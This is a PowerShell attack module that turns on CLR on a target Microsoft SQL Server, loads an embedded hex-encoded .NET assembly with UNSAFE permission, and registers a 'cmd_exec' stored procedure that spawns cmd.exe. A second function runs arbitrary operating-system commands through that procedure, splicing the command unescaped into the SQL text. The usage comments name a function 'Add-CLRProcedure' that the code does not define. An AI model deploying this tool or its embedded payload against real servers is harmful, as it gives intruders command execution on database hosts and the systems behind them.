# Instructions:
# Import the module: import-module [path]SeeClearly.ps1
# Create the custom Stored Procedure on the target: Add-CLRProcedure -Server MSSQL
# Or if you want to use local authentication: Add-CLRProcedure -Server MSSQL -Username sa -Password 'The$aPwd!'
# To execute commands: Invoke-CmdExec -Server MSSQL -Command "mkdir c:\temp"
# For more info visit sekirkity.com

function New-CLRProcedure() {
    [cmdletbinding(DefaultParameterSetName="integrated")]Param (
        [Parameter(Mandatory=$true)][string]$Server,
        [Parameter(Mandatory=$false)][string]$Database = 'msdb',
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Username,
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Password,
        [Parameter(Mandatory=$false, ParameterSetName="integrated")]$UseWindowsAuthentication = $true,
        [Parameter(Mandatory=$false)][int]$CommandTimeout=0
    )
	# The following Query contains a Dot Net assembly that spawns a command prompt process. Commands can then be executed using the Invoke-CmdExec cmdlet.
	# For the full C# code, visit sekirkity.com
	# VirusTotal link for Dot Net PE: https://www.virustotal.com/en/file/cf687b3484bdea5b79903ae09e4a1107106176f012becb9310dca07c22ce5adc/analysis/1486417110/
	$Queries = 'sp_configure @configname=clr_enabled, @configvalue=1;', 'RECONFIGURE;', 'CREATE ASSEMBLY [execcmdasm] AUTHORIZATION [dbo] FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C01030029D894580000000000000000E00002210B010B00000800000006000000000000EE260000002000000040000000000010002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000942600005700000000400000A002000000000000000000000000000000000000006000000C0000005C2500001C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000F4060000002000000008000000020000000000000000000000000000200000602E72737263000000A00200000040000000040000000A0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000000E00000000000000000000000000004000004200000000000000000000000000000000D0260000000000004800000002000500B8200000A40400000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000133003005200000001000011730500000A0A066F0600000A72010000706F0700000A066F0600000A72390000700F00280800000A280900000A6F0A00000A066F0600000A176F0B00000A066F0C00000A26066F0D00000A066F0E00000A2A1E02280F00000A2A000042534A4201000100000000000C00000076342E302E33303331390000000005006C0000008C010000237E0000F8010000D801000023537472696E677300000000D00300004C000000235553001C0400001000000023475549440000002C0400007800000023426C6F620000000000000002000001471502000900000000FA253300160000010000000A0000000200000002000000010000000F0000000400000001000000010000000300000000000A000100000000000600370030000A005F004A000600970084000F00AB0000000600DA00BA000600FA00BA000A003B0120010E00510184000E005901840006008F01300000000000010000000000010001000100100016000000050001000100502000000000960069000A000100AE20000000008618720010000200000001007800190072001400290072001A0031007200100039007200100041007200100041006A012400490078012900110085012E0051009601320049009D0129004900AB0138004100BF013D004100C50110004100D1011000090072001000200023001F002E000B0046002E0013004F002E001B005800410004800000000000000000000000000000000018010000040000000000000000000000010027000000000004000000000000000000000001003E000000000004000000000000000000000001003000000000000000003C4D6F64756C653E00616464757365722E646C6C0053746F72656450726F63656475726573006D73636F726C69620053797374656D004F626A6563740053797374656D2E446174610053797374656D2E446174612E53716C54797065730053716C537472696E6700636D645F65786563002E63746F720065786563436F6D6D616E640053797374656D2E446961676E6F73746963730044656275676761626C6541747472696275746500446562756767696E674D6F6465730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300436F6D70696C6174696F6E52656C61786174696F6E734174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650061646475736572004D6963726F736F66742E53716C5365727665722E5365727665720053716C50726F6365647572654174747269627574650050726F636573730050726F636573735374617274496E666F006765745F5374617274496E666F007365745F46696C654E616D65006765745F56616C756500537472696E6700466F726D6174007365745F417267756D656E7473007365745F5573655368656C6C457865637574650053746172740057616974466F724578697400436C6F73650000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D0000000000113A8CAB4FFE4B439E180EC25F0949350008B77A5C561934E08905000101110903200001052001011111042001010804010000000420001225042001010E0320000E0500020E0E1C04200101020320000204070112210801000200000000000801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301000000000029D8945800000000020000001C010000782500007807000052534453DE7AE90887669349B2290BE8CEC5BDEE05000000633A5C55736572735C4E6174655C446F63756D656E74735C56697375616C2053747564696F20323031335C50726F6A656374735C616464757365725C616464757365725C6F626A5C52656C656173655C616464757365722E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000BC2600000000000000000000DE260000002000000000000000000000000000000000000000000000D02600000000000000000000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000FF25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100100000001800008000000000000000000000000000000100010000003000008000000000000000000000000000000100000000004800000058400000440200000000000000000000440234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000000000000000000000000000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004A4010000010053007400720069006E006700460069006C00650049006E0066006F0000008001000001003000300030003000300034006200300000002C0002000100460069006C0065004400650073006300720069007000740069006F006E000000000020000000300008000100460069006C006500560065007200730069006F006E000000000030002E0030002E0030002E003000000038000C00010049006E007400650072006E0061006C004E0061006D006500000061006400640075007300650072002E0064006C006C0000002800020001004C006500670061006C0043006F00700079007200690067006800740000002000000040000C0001004F0072006900670069006E0061006C00460069006C0065006E0061006D006500000061006400640075007300650072002E0064006C006C000000340008000100500072006F006400750063007400560065007200730069006F006E00000030002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000030002E0030002E0030002E00300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000F03600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;', 'CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (MAX) AS EXTERNAL NAME [execcmdasm].[StoredProcedures].[cmd_exec];'
	$Conn = New-Object System.Data.SQLClient.SQLConnection
	$ConnString = "Server='$Server';Database='$Database';"
    If ($PSCmdlet.ParameterSetName -eq "not_integrated") { $ConnString += "User ID=$Username;Password=$Password;" }
    ElseIf ($PSCmdlet.ParameterSetName -eq "integrated") { $ConnString += "Trusted_Connection=Yes;Integrated Security=SSPI;" }
	$Conn.ConnectionString = $ConnString
	$Conn.Open()

	$Handler = [System.Data.SqlClient.SqlInfoMessageEventHandler] {param($sender, $event) Write-Host $event.Message }
	$Conn.add_InfoMessage($Handler); 
	$Conn.FireInfoMessageEventOnUserErrors = $true;

	foreach ($Query in $Queries)
	{
		$SqlCmd = New-Object System.Data.SQLClient.SQLCommand
		$SqlCmd.Connection = $Conn
		$SqlCmd.CommandText = $Query
		$SqlCmd.ExecuteScalar()
	}

	$Conn.Close()
}

function Invoke-CmdExec () {
    [cmdletbinding(DefaultParameterSetName="integrated")]Param (
        [Parameter(Mandatory=$true)][string]$Server,
        [Parameter(Mandatory=$false)][string]$Database = 'msdb',
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Username,
        [Parameter(Mandatory=$true, ParameterSetName="not_integrated")][string]$Password,
        [Parameter(Mandatory=$false, ParameterSetName="integrated")]$UseWindowsAuthentication = $true,
        [Parameter(Mandatory=$true)][string]$Command,
        [Parameter(Mandatory=$false)][int]$CommandTimeout=0
	)
	$Query = "EXEC [dbo].[cmd_exec] '$Command';"
	$Conn = New-Object System.Data.SQLClient.SQLConnection
	$ConnString = "Server='$Server';Database='$Database';"
    If ($PSCmdlet.ParameterSetName -eq "not_integrated") { $ConnString += "User ID=$Username;Password=$Password;" }
    ElseIf ($PSCmdlet.ParameterSetName -eq "integrated") { $ConnString += "Trusted_Connection=Yes;Integrated Security=SSPI;" }
	$Conn.ConnectionString = $ConnString
	$Conn.Open()

	$Handler = [System.Data.SqlClient.SqlInfoMessageEventHandler] {param($sender, $event) Write-Host $event.Message }
	$Conn.add_InfoMessage($Handler); 
	$Conn.FireInfoMessageEventOnUserErrors = $true;

	$SqlCmd = New-Object System.Data.SQLClient.SQLCommand
	$SqlCmd.Connection = $Conn
	$SqlCmd.CommandText = $Query
	$SqlCmd.ExecuteScalar()
	
	$Conn.Close()
}